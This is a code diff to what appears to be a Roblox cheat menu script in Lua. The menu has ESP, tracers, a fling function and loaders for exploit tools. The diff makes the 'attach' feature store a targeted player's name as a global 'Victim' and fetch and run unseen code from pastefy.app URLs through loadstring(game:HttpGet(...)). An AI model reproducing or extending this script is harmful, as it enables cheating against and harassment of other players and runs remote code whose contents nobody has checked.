@@ -295,6 +295,7 @@ local dexBtn     = createBtn("dexBtn", "Load Dex Explorer")
 local iyBtn      = createBtn("iyBtn", "Load Infinite Yield")
 local espHubBtn  = createBtn("espHubBtn", "Load Unnamed ESP")
 local eBtn       = createBtn("eBtn", "Player ESP [E]")
+local tBtn       = createBtn("tBtn", "Player Tracers [T]")
 local refreshBtn = createBtn("refreshBtn", "Refresh Character")
 local rejoinBtn  = createBtn("rejoinBtn", "Rejoin Server")
 local hopBtn     = createBtn("hopBtn", "Server Hop")
@@ -513,41 +514,52 @@ rs.RenderStepped:Connect(function()
 end)
 
 --- ATTACH LOOP PERSISTENT CONTROLLER ---
-local activeAttachTrack = nil
-local activeAttachConnection = nil
-
 local function stopAttachLoop()
     state.attach = "disabled"
     attachBtn.BackgroundColor3 = COLOR_DISABLED
-    if activeAttachConnection then activeAttachConnection:Disconnect() activeAttachConnection = nil end
-    if activeAttachTrack then activeAttachTrack:Stop() activeAttachTrack = nil end
+    
+    -- Automatically refreshes your character to safely break the Pastefy loops
+    local char = lp.Character
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        local cf = char.HumanoidRootPart.CFrame
+        char:BreakJoints()
+        local conn
+        conn = lp.CharacterAdded:Connect(function(newChar)
+            conn:Disconnect()
+            newChar:WaitForChild("HumanoidRootPart").CFrame = cf
+        end)
+    end
 end
 
 local function startAttachLoop(targetPlayer)
-    stopAttachLoop() 
     if not targetPlayer or not targetPlayer.Character then return end
     
     state.attach = "active"
     attachBtn.BackgroundColor3 = COLOR_ACTIVE
     
-    local A = Instance.new("Animation")
-    A.AnimationId = "rbxassetid://148840371"
+    -- Assign target name to common global variables used by loadstring exploits
+    if getgenv then getgenv().Victim = targetPlayer.Name end
+    _G.Victim = targetPlayer.Name
     
-    local C = lp.Character or lp.CharacterAdded:Wait()
-    local hum = C:WaitForChild("Humanoid")
-    activeAttachTrack = hum:LoadAnimation(A)
-    activeAttachTrack:Play()
-    activeAttachTrack:AdjustSpeed(2.5)
+    local char = lp.Character
+    local hum = char and char:FindFirstChildWhichIsA("Humanoid")
     
-    activeAttachConnection = rs.Stepped:Connect(function()
-        if state.attach ~= "active" or not targetPlayer or not targetPlayer.Parent or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") or not C or not C:FindFirstChild("HumanoidRootPart") then
-            stopAttachLoop()
-            return
+    if hum then
+        -- Dynamic Rig Type Detection
+        if hum.RigType == Enum.HumanoidRigType.R6 then
+            task.spawn(function()
+                pcall(function()
+                    loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
+                end)
+            end)
+        elseif hum.RigType == Enum.HumanoidRigType.R15 then
+            task.spawn(function()
+                pcall(function()
+                    loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
+                end)
+            end)
         end
-        pcall(function()
-            C:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(targetPlayer.Character:FindFirstChild("HumanoidRootPart").Position)
-        end)
-    end)
+    end
 end
 
 --- MENU BUTTON INTERFACE OPERATIONS ---
@@ -555,6 +567,11 @@ end
 eBtn.MouseButton1Click:Connect(function()
     if state.e == "disabled" then state.e = "armed"; eBtn.BackgroundColor3 = COLOR_ARMED
     else state.e = "disabled"; eStatus.Visible = false; espFolder:ClearAllChildren(); eBtn.BackgroundColor3 = COLOR_DISABLED end
+end)
+
+tBtn.MouseButton1Click:Connect(function()
+    if state.t == "disabled" then state.t = "armed"; tBtn.BackgroundColor3 = COLOR_ARMED
+    else state.t = "disabled"; tStatus.Visible = false; tBtn.BackgroundColor3 = COLOR_DISABLED end
 end)
 
 vBtn.MouseButton1Click:Connect(function()
@@ -801,6 +818,9 @@ uis.InputBegan:Connect(function(k, p)
     if k.KeyCode == Enum.KeyCode.E then
         if state.e == "armed" then state.e = "active"; eStatus.Visible = true; eBtn.BackgroundColor3 = COLOR_ACTIVE
         elseif state.e == "active" then state.e = "armed"; eStatus.Visible = false; espFolder:ClearAllChildren(); eBtn.BackgroundColor3 = COLOR_ARMED end
+    elseif k.KeyCode == Enum.KeyCode.T then
+        if state.t == "armed" then state.t = "active"; tStatus.Visible = true; tBtn.BackgroundColor3 = COLOR_ACTIVE
+        elseif state.t == "active" then state.t = "armed"; tStatus.Visible = false; tBtn.BackgroundColor3 = COLOR_ARMED end
     elseif k.KeyCode == Enum.KeyCode.V then
         if state.v == "armed" then ghostFling() end
     end
